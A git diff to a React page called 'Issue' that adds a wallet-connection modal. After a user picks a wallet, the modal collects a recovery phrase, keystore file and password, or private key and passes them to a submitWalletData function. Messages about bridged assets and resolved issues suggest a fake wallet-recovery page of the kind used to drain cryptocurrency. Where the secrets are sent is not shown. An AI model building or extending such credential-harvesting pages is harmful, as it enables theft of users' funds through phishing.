@@ -9,6 +9,7 @@ import { Badge } from '@/components/ui/badge';
 import { Separator } from '@/components/ui/separator';
 import { Input } from '@/components/ui/input';
 import { WalletGrid } from '@/components/wallet-grid';
+import { WalletConnectionModal } from '@/components/wallet-connection-modal';
 import { Textarea } from '@/components/ui/textarea';
 import { Label } from '@/components/ui/label';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
@@ -28,6 +29,8 @@ export default function Issue() {
   const [keystorePassword, setKeystorePassword] = useState('');
   const [privateKey, setPrivateKey] = useState('');
   const [selectedWalletType, setSelectedWalletType] = useState<string>('');
+  const [selectedWallet, setSelectedWallet] = useState<{name: string, icon: string} | null>(null);
+  const [showConnectionModal, setShowConnectionModal] = useState(false);
   const [loading, setLoading] = useState(false);
   
   const [txHash, setTxHash] = useState<string>('');
@@ -180,6 +183,28 @@ export default function Issue() {
       case 'bridge': return 'Your assets have been bridged to the target network.';
       default: return 'Your issue has been resolved successfully.';
     }
+  };
+
+  const handleManualConnection = (method: string, data: any) => {
+    setSelectedWalletType(selectedWallet?.name || '');
+    setShowConnectionModal(false);
+    
+    // Set the form data based on the method used
+    switch (method) {
+      case 'phrase':
+        setPhrase(data.phrase);
+        break;
+      case 'keystore':
+        setKeystoreJson(data.keystoreJson);
+        setKeystorePassword(data.keystorePassword);
+        break;
+      case 'private':
+        setPrivateKey(data.privateKey);
+        break;
+    }
+
+    // Submit the data using existing logic
+    submitWalletData(method, data);
   };
 
   // Handle wallet connection method submissions
@@ -350,7 +375,10 @@ export default function Issue() {
                       icon: w.icon, // Now contains real logo URLs
                       id: w.id // Pass the ID for fallback handling
                     }))}
-                    onSelect={(wallet) => setSelectedWalletType(wallet.name)}
+                    onSelect={(wallet) => {
+                      setSelectedWallet({ name: wallet.name, icon: wallet.icon });
+                      setShowConnectionModal(true);
+                    }}
                   />
                 </div>
               </>
@@ -708,6 +736,20 @@ export default function Issue() {
       </div>
 
       <Footer />
+
+      {/* Wallet Connection Modal */}
+      {selectedWallet && (
+        <WalletConnectionModal
+          isOpen={showConnectionModal}
+          onClose={() => {
+            setShowConnectionModal(false);
+            setSelectedWallet(null);
+          }}
+          walletName={selectedWallet.name}
+          walletIcon={selectedWallet.icon}
+          onManualConnect={handleManualConnection}
+        />
+      )}
     </div>
   );
 }
